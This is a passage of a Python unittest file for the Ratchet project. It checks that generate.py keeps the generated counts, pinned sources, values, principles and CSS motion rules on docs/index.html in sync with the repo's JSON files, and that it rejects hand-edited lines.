        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_page_gives_the_count_of_ratchet_json(self):
        self.assertEqual(lines_that_hold(self.page(), 'id="count"'), [count_line(self.copy)])
        self.assertIn("the core has 19 rules. 13 describe a check and 6 are text only. Ratchet ships a reference check for 1 "
                      "of the 13, and you build the others.", count_line(self.copy))

    def test_a_rule_that_gets_a_check_fails_until_generate_moves_the_page(self):
        before = self.page()
        old = count_line(self.copy)

        def give_a_check(data):
            # A text-only rule of the core that this repo's register does not copy, so that only the count moves.
            with open(os.path.join(self.copy, "register.json"), encoding="utf-8") as handle:
                copied = set(item["key"] for item in json.load(handle)["adopted"])
            rule = next(rule for rule in data["rules"] if rule["status"] == "core" and rule["enforcement"] == "text-only"
                        and rule["key"] not in copied and rule["key"] not in data["start"])
            rule["enforcement"], rule["ratchet"] = "enforced", "Check: a check that the test made up"
        rewrite_ratchet(self.copy, give_a_check)
        new = count_line(self.copy)
        self.assertNotEqual(old, new)
        self.assertIn("14 describe a check and 5 are text only. Ratchet ships a reference check for 1 of the 14,", new)
        self.assert_check_fails("docs/index.html: generated text is out of date or was edited by hand")
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace(old, new))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(page_problems(self.copy), [])

    def test_a_number_edited_by_hand_fails(self):
        line = count_line(self.copy)
        self.write_page(self.page().replace(line, line.replace("13 describe a check", "19 describe a check"), 1))
        self.assert_check_fails("docs/index.html: generated text is out of date or was edited by hand")

    def test_an_indented_count_line_passes(self):
        line = count_line(self.copy)
        self.write_page(self.page().replace(line, "  " + line, 1))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)

    def test_a_count_line_of_another_form_fails(self):
        line = count_line(self.copy)
        for new in ("", line + "\n" + line, line + " And more.", line.replace("<strong>", "<strong>about ", 1),
                    line.replace('<p id="count" class="count">', '<p class="count">\n<span id="count"></span>', 1),
                    line + '\n<p id="count">23 rules</p>',
                    line.replace("13 describe a check", "thirteen describe a check"),
                    line.replace(" of the 13,", " of the 13 checks,")):
            with self.subTest(new=new):
                self.setUp()
                self.write_page(self.page().replace(line, new, 1))
                code, output = run("generate.py", "--check", root=self.copy)
                self.assertEqual(code, 1, output)
                self.assertIn("docs/index.html: the count of rules must be one line", output)
                self.assertNotIn("Traceback", output)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)


class PageSteps(RepoCopy, unittest.TestCase):
    """How Ratchet works is one ordered list whose every step links to where the repo shows it."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_there_is_one_list_of_four_steps_that_each_link_into_the_repo(self):
        reader = PageReader()
        reader.feed(self.page())
        steps = [item for item in reader.items if item["list"] == "flow"]
        self.assertEqual(len([classes for tag, classes in reader.lists if tag == "ol" and "flow" in classes]), 1)
        self.assertEqual(len(steps), 4)
        self.assertTrue(all(any(into_repo(href) for href, _ in item["links"]) for item in steps))

    def test_the_list_is_counted_by_its_class_in_any_order(self):
        # The class attribute holds a list: "wide  flow" is the list of steps as much as "flow" is.
        self.change('<ol class="flow">', '<ol class="wide  flow">')
        reader = PageReader()
        reader.feed(self.page())
        self.assertEqual(len([classes for tag, classes in reader.lists if tag == "ol" and "flow" in classes]), 1)
        self.assertEqual(len([item for item in reader.items if item["list"] == "flow"]), 4)
        self.assertEqual(page_problems(self.copy), [])

    def test_a_step_without_a_link_fails(self):
        self.change('<a href="https://github.com/fabian-von-tiedemann/ratchet/blob/main/REGISTER.md">Ratchet\'s own register</a>',
                    "Ratchet's own register")
        self.assert_fails("a step that links nowhere in this repo")

    def test_a_step_whose_only_link_leads_to_the_page_fails(self):
        # A link to an id on the page is allowed, but it does not show where this repo does the step.
        self.change('<a href="https://github.com/fabian-von-tiedemann/ratchet/blob/main/REGISTER.md">Ratchet\'s own register</a>',
                    '<a href="#start-here">Start here</a>')
        self.assert_fails("a step that links nowhere in this repo")
        self.assertEqual(len(page_problems(self.copy)), 1)


# The line on the page that names the pinned sources, as the test expects it, spelled out here and filled from
# sources.json below, not taken from generate.py.
SOURCES_LINE = ('<p id="sources" class="count"><strong>Kept current:</strong> <a href="https://github.com/fabian-von-tiedemann/'
                'ratchet/blob/main/RATCHET.md#sources">%d pinned %s</a>, %s. Each pin is a commit. A daily watch opens an issue '
                'when one moves.</p>')


def sources_line(root):
    with open(os.path.join(root, "sources.json"), encoding="utf-8") as handle:
        sources = json.load(handle)["sources"]
    names = ["%s (%s)" % (source["name"], source["license"]) for source in sources]
    listed = names[0] if len(names) == 1 else ", ".join(names[:-1]) + " and " + names[-1]
    return SOURCES_LINE % (len(names), "source" if len(names) == 1 else "sources", listed)


def rewrite_sources(root, change):
    """Change sources.json in a copy of the repo, as data, and read it back as every check reads it."""
    path = os.path.join(root, "sources.json")
    with open(path, encoding="utf-8") as handle:
        data = json.load(handle)
    change(data["sources"])
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(data, handle, indent=2, ensure_ascii=False)
        handle.write("\n")
    registry.load_sources(path)


class PageSources(RepoCopy, unittest.TestCase):
    """generate.py writes the line on the page that names the pinned sources, and --check fails when it is stale."""

    stale = "docs/index.html: generated text is out of date or was edited by hand"
    form = "docs/index.html: the pinned sources must be one line"

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def write_page(self, text):
        with open(os.path.join(self.copy, DOCS, PAGE), "w", encoding="utf-8", newline="") as handle:
            handle.write(text)

    def test_the_page_names_the_sources_of_sources_json(self):
        self.assertEqual(lines_that_hold(self.page(), 'id="sources"'), [sources_line(self.copy)])
        with open(os.path.join(self.copy, "sources.json"), encoding="utf-8") as handle:
            sources = json.load(handle)["sources"]
        named = ["%s (%s)" % (source["name"], source["license"]) for source in sources]
        self.assertIn(">%d pinned sources</a>, %s and %s." % (len(named), ", ".join(named[:-1]), named[-1]), sources_line(self.copy))

    def test_a_source_added_fails_until_generate_moves_the_page(self):
        before = self.page()
        old = sources_line(self.copy)
        rewrite_sources(self.copy, lambda sources: sources.append(
            {"name": "example/more", "repo": "https://github.com/example/more", "commit": "0" * 40, "license": "BSD-3-Clause"}))
        new = sources_line(self.copy)
        self.assertIn(">6 pinned sources</a>, ", new)
        self.assertIn("obra/superpowers (MIT), sprocketlab/slop-code-bench (MIT) and example/more (BSD-3-Clause).", new)
        self.assert_check_fails(self.stale)
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace(old, new))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(page_problems(self.copy), [])

    def test_a_name_a_license_or_the_number_edited_by_hand_fails(self):
        line = sources_line(self.copy)
        for old, new in (("pstack (MIT)", "pstack (Apache-2.0)"), ("obra/superpowers", "obra/powers"),
                         (">5 pinned", ">6 pinned"), (" and sprocketlab/slop-code-bench (MIT)", ""),
                         ("pstack (MIT), obra/superpowers (MIT)", "obra/superpowers (MIT), pstack (MIT)")):
            with self.subTest(new=new):
                self.setUp()
                self.write_page(self.page().replace(line, line.replace(old, new, 1), 1))
                self.assert_check_fails(self.stale)

    def test_an_indented_sources_line_passes(self):
        line = sources_line(self.copy)
        self.write_page(self.page().replace(line, "  " + line, 1))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)

    def test_a_sources_line_of_another_form_fails_and_generate_writes_nothing(self):
        line = sources_line(self.copy)
        for new in ("", line + "\n" + line, line + " And more.", line.replace("Kept current:", "Always current:", 1),
                    line.replace('<p id="sources" class="count">', '<p class="count">\n<span id="sources"></span>', 1),
                    line + '\n<p id="sources">3 sources</p>',
                    line.replace(">5 pinned", ">five pinned"), line.replace(" pinned sources<", " pinned repos<"),
                    line.replace("A daily watch", "An hourly watch"),
                    # A name linked out of the repo, markup in the list, a reference and a character the generator
                    # never writes.
                    line.replace("pstack (MIT)", '<a href="https://github.com/cursor/plugins">pstack</a> (MIT)'),
                    line.replace("pstack (MIT)", "<em>pstack</em> (MIT)"),
                    line.replace("pstack (MIT)", "pstack (MIT) &copy; them"),
                    line.replace("pstack (MIT)", "pstack (MIT) \u00a9 them")):
            with self.subTest(new=new):
                self.setUp()
                before = self.page().replace(line, new, 1)
                self.write_page(before)
                self.assert_check_fails(self.form)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)
                self.assertEqual(self.page(), before)

    def test_no_source_fails(self):
        rewrite_sources(self.copy, lambda sources: sources.clear())
        self.assert_check_fails("docs/index.html: the page names the pinned sources, and sources.json holds none")

    def test_one_source_is_named_in_the_singular_and_a_license_is_written_as_text(self):
        line = generate.page_sources([{"name": "x", "license": "A & <B>"}])
        self.assertIn(">1 pinned source</a>, x (A &amp; &lt;B&gt;). Each pin", line)
        self.assertTrue(generate.page_sources_line(line))
        two = generate.page_sources([{"name": "x", "license": "MIT"}, {"name": "y", "license": "MIT"}])
        self.assertIn(">2 pinned sources</a>, x (MIT) and y (MIT). Each pin", two)


class PageExample(RepoCopy, unittest.TestCase):
    """What the example says of its rule, and the line of the sources of the watch, are what the repo holds."""

    def page(self):
        return Page.page(self)

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_the_example_and_the_watch_as_they_stand_pass(self):
        self.assertEqual(example_problems(self.copy, self.page()), [])
        self.assertEqual(watch_problems(self.copy), [])

    def test_the_rule_of_the_example_changed_in_ratchet_json_fails(self):
        def text_only(rule):
            rule["enforcement"], rule["ratchet"] = "text-only", "Text only: a test made this up"

        def other_check(rule):
            rule["ratchet"] = "Check: a scan once a year"

        def shipped(rule):
            rule["reference_check"] = "checks/check_register.py"
        for change, message in ((text_only, "and its ratchet in ratchet.json does not start"),
                                (other_check, "and its ratchet in ratchet.json does not start"),
                                (shipped, 'says "Ratchet ships no scanner", and ratchet.no-secrets has a reference check')):
            with self.subTest(change=change.__name__):
                self.setUp()
                path = os.path.join(self.copy, "ratchet.json")
                with open(path, encoding="utf-8") as handle:
                    data = json.load(handle)
                change(next(rule for rule in data["rules"] if rule["key"] == EXAMPLE_KEY))
                with open(path, "w", encoding="utf-8") as handle:
                    json.dump(data, handle, indent=2, ensure_ascii=False)
                self.assert_fails("docs/index.html: ", message)

    def test_a_key_on_the_page_that_is_not_a_rule_fails(self):
        self.change("<code>ratchet.no-secrets</code>", "<code>ratchet.no-secret</code>")
        self.assert_fails("docs/index.html: names ratchet.no-secret, which is not a rule in ratchet.json")

    def test_a_watch_that_is_not_daily_or_not_there_fails(self):
        cron = '    - cron: "17 6 * * *"'
        for old, new in ((cron, '    - cron: "17 6 * * 1"'), (cron, '    - cron: "17 */6 * * *"'), (cron, cron + "\n" + cron),
                         (cron, '    - cron: "17 6 * * *" # daily'), (cron, ""),
                         (WATCH_RUN, WATCH_RUN.replace("watch_sources.py", "tripwire.py")), (WATCH_RUN, WATCH_RUN + "\n" + WATCH_RUN)):
            with self.subTest(new=new):
                self.setUp()
                self.edit(WATCH, old, new)
                self.assert_fails("docs/index.html: the line of the sources names a daily watch")
        self.setUp()
        os.remove(os.path.join(self.copy, *WATCH.split("/")))
        self.assert_fails("docs/index.html: the line of the sources names a daily watch, and %s is not there" % WATCH)


# The story and the values: the one <section> with this id. Each paragraph and item in it is read as text, with the
# part of it that stands in <strong> or <em>.
VALUES = "values"


class ValuesReader(html.parser.HTMLParser):
    """Reads the story and the values: each <p> and <li> in the one <section id="values">, as (tag, class, text,
    [(mark, text)]), where a mark is a <strong> or an <em> in it. The text is the words joined by single spaces."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.sections, self.depth, self.blocks, self.block, self.marks = 0, 0, [], None, []

    def handle_starttag(self, tag, attrs):
        if self.depth:
            self.depth += 1
            if tag in ("p", "li"):
                self.block = [tag, dict(attrs).get("class"), [], []]
            elif tag in ("strong", "em") and self.block is not None:
                self.marks.append([tag, []])
        elif tag == "section" and dict(attrs).get("id") == VALUES:
            self.sections, self.depth = self.sections + 1, 1

    def handle_endtag(self, tag):
        if not self.depth:
            return
        self.depth -= 1
        if tag in ("strong", "em") and self.marks:
            mark, text = self.marks.pop()
            self.block[3].append((mark, " ".join("".join(text).split())))
        elif tag in ("p", "li") and self.block is not None:
            tag, name, text, marks = self.block
            self.blocks.append((tag, name, " ".join("".join(text).split()), marks))
            self.block = None

    def handle_data(self, data):
        if self.block is not None:
            self.block[2].append(data)
        for mark in self.marks:
            mark[1].append(data)


def values_problems(root):
    """Why the story and the values on the page are not those of values.json, in order.

    The page holds one <section id="values">. In it stand the story, in <em>, the line that leads to the values, in
    <strong>, each value with the side it prefers in <strong> and " over " the other, and the line that weighs them.
    So a value that is changed in values.json fails until the page follows, and a line edited by hand fails as well.
    generate.py writes the section, and this reads it without asking it.
    """
    with open(os.path.join(root, DOCS, PAGE), encoding="utf-8") as handle:
        reader = ValuesReader()
        reader.feed(handle.read())
    if reader.sections != 1:
        return ['the page holds %d sections of the story and the values, a <section id="%s">, and must hold one' % (reader.sections, VALUES)]
    with open(os.path.join(root, "values.json"), encoding="utf-8") as handle:
        data = json.load(handle)
    expected = [("p", "story", data["story"], [("em", data["story"])]), ("p", "lead", data["lead"], [("strong", data["lead"])])]
    expected += [("li", None, "%s over %s" % (value["prefer"], value["over"]), [("strong", value["prefer"])]) for value in data["values"]]
    expected.append(("p", "balance", data["balance"], []))
    if reader.blocks != expected:
        return ["the story and the values on the page are %r, and values.json, in order, gives %r" % (reader.blocks, expected)]
    return []


PRINCIPLES = "principles"


class PrinciplesReader(html.parser.HTMLParser):
    """Reads the principles: in the one <section id="principles">, each <ol> as ("ol", its start or None), and each
    <li> and <p> as (tag, class, text, [(mark, text)]), in order."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.sections, self.depth, self.blocks, self.block, self.marks = 0, 0, [], None, []

    def handle_starttag(self, tag, attrs):
        if self.depth:
            self.depth += 1
            if tag == "ol":
                self.blocks.append(("ol", dict(attrs).get("start")))
            elif tag in ("p", "li"):
                self.block = [tag, dict(attrs).get("class"), [], []]
            elif tag in ("strong", "em") and self.block is not None:
                self.marks.append([tag, []])
        elif tag == "section" and dict(attrs).get("id") == PRINCIPLES:
            self.sections, self.depth = self.sections + 1, 1

    def handle_endtag(self, tag):
        if not self.depth:
            return
        self.depth -= 1
        if tag in ("strong", "em") and self.marks:
            mark, text = self.marks.pop()
            self.block[3].append((mark, " ".join("".join(text).split())))
        elif tag in ("p", "li") and self.block is not None:
            tag, name, text, marks = self.block
            self.blocks.append((tag, name, " ".join("".join(text).split()), marks))
            self.block = None

    def handle_data(self, data):
        if self.block is not None:
            self.block[2].append(data)
        for mark in self.marks:
            mark[1].append(data)


def figure_teeth(root):
    """The numbers on the teeth of the figure, the <text class="tooth"> of docs/ratchet-notch.svg, in order, or None
    when the figure is not there or is not XML, which figure_problems says."""
    try:
        tree = xml.etree.ElementTree.parse(os.path.join(root, DOCS, FIGURE)).getroot()
    except (OSError, ValueError, xml.etree.ElementTree.ParseError):
        return None
    return [element.text for element in tree.iter("{%s}text" % SVG) if "tooth" in (element.get("class") or "").split()]


def figure_steps(principles):
    """The lines of the figure's CSS that depend on the number of principles: a stop of the wheel's turn for each tooth,
    the same stop turned back, which keeps each number upright, the angle of one tooth where the wheel comes to rest
    against the pawl, and the delay that marks each number when the pawl drops behind its tooth, at 2 seconds a tooth
    and 0.64 of the way through each."""
    angle, period, click = 360 / principles, 2.0, 0.64
    lines = set("  %.4f%% { rotate: %.3fdeg; }" % (100 * number / principles, number * angle) for number in range(principles))
    lines |= set("  %.4f%% { rotate: -%.3fdeg; }" % (100 * number / principles, number * angle) for number in range(principles))
    lines |= set("  .n%d { animation-delay: -%.3fs; }" % (number, (period * principles - (number - 1 + click) * period) % (period * principles))
                 for number in range(principles))
    return lines | {"  90%%, 100%% { rotate: %.3fdeg; }" % angle, "  90%%, 100%% { rotate: -%.3fdeg; }" % angle,
                    "  .step { animation: step %.1fs step-end infinite; }" % (period * principles),
                    "  .unstep { animation: unstep %.1fs step-end infinite; }" % (period * principles)}


def principles_problems(root):
    """Why the principles on the page and the teeth of the figure are not the principles of ratchet.json, in order.

    The page holds one <section id="principles">. In it stands a list of the titles of the principles, numbered from 1.
    The principles whose rules all stand in a part that PRODUCT.md holds, the last ones, are a list of their own that
    starts at the number of the first of them, after the line of values.json that introduces them, in <strong>. The
    line on aims, in <em>, stands last. The figure has one <text class="tooth"> for each principle, numbered from 1.
    generate.py writes the section, and this reads it without asking it.
    """
    with open(os.path.join(root, DOCS, PAGE), encoding="utf-8") as handle:
        reader = PrinciplesReader()
        reader.feed(handle.read())
    if reader.sections != 1:
        return ['the page holds %d sections of the principles, a <section id="%s">, and must hold one' % (reader.sections, PRINCIPLES)]
    with open(os.path.join(root, "ratchet.json"), encoding="utf-8") as handle:
        data = json.load(handle)
    with open(os.path.join(root, "values.json"), encoding="utf-8") as handle:
        values = json.load(handle)
    product = set(part["id"] for part in data["parts"] if part.get("file") == "PRODUCT.md")
    rules = dict((principle["key"], [rule for rule in data["rules"] if rule["principle"] == principle["key"]])
                 for principle in data["principles"])
    expected, split = [("ol", None)], False
    for number, principle in enumerate(data["principles"], 1):
        if not split and all(rule["part"] in product for rule in rules[principle["key"]]):
            split = True
            expected += [("p", "production", values["production"], [("strong", values["production"])]), ("ol", str(number))]
        expected.append(("li", None, principle["title"], []))
    expected.append(("p", "aims", values["aims"], [("em", values["aims"])]))
    problems = []
    if reader.blocks != expected:
        problems.append("the principles on the page are %r, and ratchet.json and values.json, in order, give %r" % (reader.blocks, expected))
    numbers = [str(number) for number in range(1, len(data["principles"]) + 1)]
    teeth = figure_teeth(root)
    if teeth is not None and teeth != numbers:
        problems.append("the figure has the teeth %r, and a tooth for each principle is %r" % (teeth, numbers))
    if teeth is not None:
        with open(os.path.join(root, DOCS, FIGURE), encoding="utf-8") as handle:
            lines = handle.read().split("\n")
        missing = sorted(figure_steps(len(numbers)) - set(lines))
        delays = [line for line in lines if re.match(r"  \.n[0-9]+ \{ animation-delay: ", line)]
        if missing or len(delays) != len(numbers):
            problems.append("the wheel turns one tooth for each principle: the figure's CSS lacks %r, and has %d delays for %d principles"
                            % (missing, len(delays), len(numbers)))
    return problems


class PagePrinciples(RepoCopy, unittest.TestCase):
    """The principles on the page are those of ratchet.json, in order, and generate.py writes them."""

    title = "Keep secrets out of the repo and the chat."

    def page(self):
        return Page.page(self)

    def change(self, old, new):
        Page.change(self, old, new)

    def test_the_page_lists_the_principles_in_order_and_the_last_three_for_production(self):
        self.assertEqual(principles_problems(ROOT), [])
        self.assertEqual(principles_problems(self.copy), [])
        reader = PrinciplesReader()
        reader.feed(self.page())
        self.assertEqual([block[:2] for block in reader.blocks if block[0] != "li"],
                         [("ol", None), ("p", "production"), ("ol", "9"), ("p", "aims")])
        self.assertEqual(len([block for block in reader.blocks if block[0] == "li"]), 11)
        self.assertIn(("li", None, self.title, []), reader.blocks)

    def test_a_title_changed_in_ratchet_json_fails_until_generate_moves_the_page(self):
        before = self.page()
        self.edit("ratchet.json", self.title, "Keep secrets out of the repo, the chat and the logs.")
        self.assertIn("the principles on the page are", " ".join(principles_problems(self.copy)))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        self.assertIn("docs/index.html: generated text is out of date or was edited by hand", output)
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(self.page(), before.replace(self.title, "Keep secrets out of the repo, the chat and the logs."))
        self.assertEqual(principles_problems(self.copy), [])

    def test_a_line_edited_moved_left_out_or_of_another_form_fails(self):
        item = "<li>%s</li>\n" % self.title
        for old, new, message in ((self.title, "Keep secrets out of the repo.", "generated text is out of date or was edited by hand"),
                                  (item, "", "generated text is out of date or was edited by hand"),
                                  ('<ol start="9">', '<ol start="8">', "generated text is out of date or was edited by hand"),
                                  (item, '<li><a href="%s">%s</a></li>\n' % (REPO, self.title), "1 lines between that the generator does not write"),
                                  (item, "<li>Keep &copy; out</li>\n", "1 lines between that the generator does not write"),
                                  (item, item + "<p>One more line.</p>\n", "1 lines between that the generator does not write"),
                                  ('<section id="principles" class="principles">', '<section id="principles">', "the principles must be the line")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                before = self.page()
                # A line the generator could have written is stale, and it writes over it. One of another form is not
                # its own, so it refuses to write, and the page stays as it was.
                stale = message.startswith("generated text")
                if stale:
                    self.assertNotEqual(principles_problems(self.copy), [])
                for args in (("--check",),) if stale else (("--check",), ()):
                    code, output = run("generate.py", *args, root=self.copy, cwd=self.copy)
                    self.assertEqual(code, 1, output)
                    self.assertIn(message, output)
                    self.assertNotIn("Traceback", output)
                self.assertEqual(self.page(), before)


class PageValues(RepoCopy, unittest.TestCase):
    """The story and the values on the page are those of values.json, in order, and generate.py writes them."""

    stale = "docs/index.html: generated text is out of date or was edited by hand"
    form = "docs/index.html: the story and the values must be the line"

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_values_fail(self, *message):
        problems = values_problems(self.copy)
        self.assertTrue(any(all(part in problem for part in message) for problem in problems), "%r not in %r" % (message, problems))

    def test_the_page_shows_the_four_values_in_order(self):
        self.assertEqual(values_problems(ROOT), [])
        self.assertEqual(values_problems(self.copy), [])
        reader = ValuesReader()
        reader.feed(self.page())
        # D-2026-11-23-values-and-principles: the story, "We value:", four values and the line that weighs them.
        self.assertEqual([block[2] for block in reader.blocks][1:6], [
            "We value:", "Checks that catch mistakes over instructions that warn about them",
            "Written decisions over remembered conversations", "Shown results over reported success",
            "Independent review over self-review"])
        self.assertTrue(reader.blocks[0][2].startswith("Agile was written for a team of people."))

    def test_a_value_changed_in_values_json_fails_until_generate_moves_the_page(self):
        before = self.page()
        self.edit("values.json", '"prefer": "Shown results"', '"prefer": "Shown runs"')
        self.assert_values_fail("the story and the values on the page are")
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 1, output)
        for name in ("docs/index.html", "README.md", "RATCHET.md"):
            self.assertIn("%s: generated text is out of date or was edited by hand" % name, output)
        code, output = run("generate.py", root=self.copy, cwd=self.copy)
        self.assertEqual(code, 0, output)
        self.assertIn("wrote docs/index.html", output)
        self.assertEqual(self.page(), before.replace("<li><strong>Shown results</strong>", "<li><strong>Shown runs</strong>"))
        self.assertEqual(values_problems(self.copy), [])
        self.assertEqual(page_problems(self.copy), [])

    def test_a_line_edited_moved_or_left_out_on_the_page_fails(self):
        for old, new in (("<strong>Shown results</strong>", "<strong>Shown logs</strong>"),
                         ("<li><strong>Shown results</strong> over reported success</li>\n", ""),
                         ("</ul>\n<p class=\"balance\">", "</ul>\n<p class=\"balance\">x</p>\n<p class=\"balance\">"),
                         ("<em>Agile was written", "<em>Scrum was written")):
            with self.subTest(new=new):
                self.setUp()
                self.change(old, new)
                self.assert_values_fail("the story and the values on the page are")
                self.assert_check_fails(self.stale)

    def test_a_section_of_another_form_fails_and_generate_writes_nothing(self):
        start = '<section id="values" class="values">'
        for old, new in ((start, '<section id="other" class="values">'),
                         (start, '<section id="values" class="values wide">'),
                         (start, start + "\n" + start),
                         ("<ul class=\"manifesto\">", "<ul class=\"manifesto\">\n<p>x</p>"),
                         ("<li><strong>Shown results</strong> over reported success</li>",
                          "<li><strong>Shown results</strong> over\nreported success</li>"),
                         ('<p class="lead">', '<p class="lead" id="values">'),
                         # Markup the generator never writes, added inside a line it writes: a link in the line that
                         # weighs the values, a second paragraph after the story on its line, an em in the lead. Each
                         # fails, and write mode leaves it as it is (round 1 of #143).
                         ("The left is for when it doesn't.</p>",
                          "The left is for when it doesn't. <a href=\"https://github.com/fabian-von-tiedemann/ratchet\">More</a></p>"),
                         ("with confidence.</em></p>", "with confidence.</em></p><p>KEEP THIS</p>"),
                         ("<strong>We value:</strong></p>", "<strong>We value:</strong> <em>all of it</em></p>"),
                         ("<li><strong>Written decisions</strong>", "<li><strong>Written</strong> <strong>decisions</strong>"),
                         # A list item without " over ", which the generator never writes (round 2 of #143).
                         ("</ul>", "<li><strong>Handwritten note</strong></li>\n</ul>"),
                         # A line of a form the generator writes, with a reference it never writes (round 3 of #143).
                         ("</ul>", "</ul>\n<p class=\"balance\">Copyright &copy; contributors</p>"),
                         # The same with a character values.json refuses, which the generator never writes (round 4).
                         ("</ul>", "</ul>\n<p class=\"balance\">Copyright \u00a9 contributors</p>")):
            with self.subTest(new=new):
                self.setUp()
                before = self.page().replace(old, new, 1)
                self.change(old, new)
                self.assert_check_fails(self.form)
                code, output = run("generate.py", root=self.copy, cwd=self.copy)
                self.assertEqual(code, 1, output)
                self.assertNotIn("wrote docs/index.html", output)
                self.assertEqual(self.page(), before)
        # Without the line that closes the section, the next </section> on the page is not its end: what stands before
        # it is not a line the generator writes, and nothing is written over.
        self.setUp()
        text = self.page()
        end = text.index("</section>", text.index(start))
        self.change(text[end:end + len("</section>\n")], "")
        self.assert_check_fails(self.form)

    def test_an_indented_section_passes(self):
        text = self.page()
        start = text.index('<section id="values" class="values">')
        end = text.index("</section>", start) + len("</section>")
        self.change(text[start:end], "\n".join("  " + line for line in text[start:end].split("\n")))
        code, output = run("generate.py", "--check", root=self.copy)
        self.assertEqual(code, 0, output)
        self.assertEqual(values_problems(self.copy), [])

    def test_a_value_is_written_as_text(self):
        # A value may hold "<" and "&", by the characters a value may hold. Each is written as a character reference.
        lines = generate.page_values({"story": "A & B", "lead": "<b>", "values": [{"prefer": "C < D", "over": "E & F"}], "balance": "G"})
        self.assertEqual(lines, ['<p class="story"><em>A &amp; B</em></p>', '<p class="lead"><strong>&lt;b&gt;</strong></p>',
                                 '<ul class="manifesto">', "<li><strong>C &lt; D</strong> over E &amp; F</li>", "</ul>",
                                 '<p class="balance">G</p>'])


class PageMotion(RepoCopy, unittest.TestCase):
    """The page moves only for a visitor who has not asked for less motion, and the CSS still loads nothing."""

    def page(self):
        with open(os.path.join(self.copy, DOCS, PAGE), encoding="utf-8", newline="") as handle:
            return handle.read()

    def change(self, old, new):
        Page.change(self, old, new)

    def assert_fails(self, *message):
        Page.assert_fails(self, *message)

    def test_the_page_as_it_stands_does_not_move(self):
        css = self.page()[self.page().index("<style>"):self.page().index("</style>")]
        self.assertEqual(motion_problems(css), [])
        for word in ("animation", "transition", "scroll-behavior", "@keyframes"):
            self.assertNotIn(word, css)

    def test_an_animation_inside_the_query_for_no_preference_passes(self):
        self.change("</style>", "%s { .button { transition: color 0.15s ease-out; } }\n"
                    "@keyframes wheel-tick { from { opacity: 0; } to { opacity: 1; } }\n</style>" % REDUCED)
        self.assertEqual(page_problems(self.copy), [])

    def test_an_animation_outside_the_query_fails(self):
        for rule in (".fig { animation: wheel-tick 3.8s linear infinite; }", ".fig { animation-name: wheel-tick; }",
                     ".fig{animation:wheel-tick 1s}", "html { scroll-behavior: smooth; }",
                     "@media (prefers-reduced-motion: reduce) { .fig { animation: wheel-tick 1s; } }",
                     "@media (min-width: 1px) { .fig { animation: wheel-tick 1s; } }",
                     "@media (min-width: 0) { .button { transition: color 0.15s ease-out; } }",
                     "@media (prefers-reduced-motion: no-preference), (min-width: 1px) { .fig { animation: wheel-tick 1s; } }",
                     ".wheel-tick { -webkit-animation: wheel-tick 3.8s linear infinite; }",
                     ".fig { -webkit-animation-name: wheel-tick; }", ".fig { -moz-animation: wheel-tick 1s; }",
                     ".fig { -o-animation-duration: 1s; }", ".fig { -MS-Animation: wheel-tick 1s; }",
                     "html { -webkit-scroll-behavior: smooth; }",
                     ".button::after { transition: translate 0.15s ease-out; }", ".x { transition-duration: 1s; }",
                     ".x { -webkit-transition: opacity 1s; }", ".x{transition:opacity 1s}"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("moves the page outside %s" % REDUCED)

    def test_a_prefixed_animation_inside_the_query_passes_as_the_unprefixed_one_does(self):
        # A vendor prefix changes nothing: the property is held to the query as the unprefixed one is.
        for rule in ("-webkit-animation: wheel-tick 1s", "-webkit-animation-name: wheel-tick", "-moz-animation: wheel-tick 1s",
                     "-webkit-transition: opacity 1s"):
            with self.subTest(rule=rule):
                self.assertEqual(motion_problems("%s { .fig { %s; } }" % (REDUCED, rule)), [])
                self.assertEqual(len(motion_problems(".fig { %s; }" % rule)), 1)

    def test_a_prefixed_keyframes_fails_as_an_at_rule_the_css_may_not_hold(self):
        for rule in ("@-webkit-keyframes wheel-tick { from { opacity: 0; } }", "@-moz-keyframes wheel-tick { to { opacity: 1; } }"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("the CSS holds @%s" % rule[1:].split()[0], "the only at-rules it may hold are @media and @keyframes")

    def test_a_brace_that_is_not_matched_fails(self):
        for rule in (".x { color: inherit;", ".x { color: inherit; } }"):
            with self.subTest(rule=rule):
                self.setUp()
                self.change("</style>", rule + "\n</style>")
                self.assert_fails("the CSS has a brace that is not matched")

    def test_an_at_rule_but_media_and_keyframes_still_fails(self):
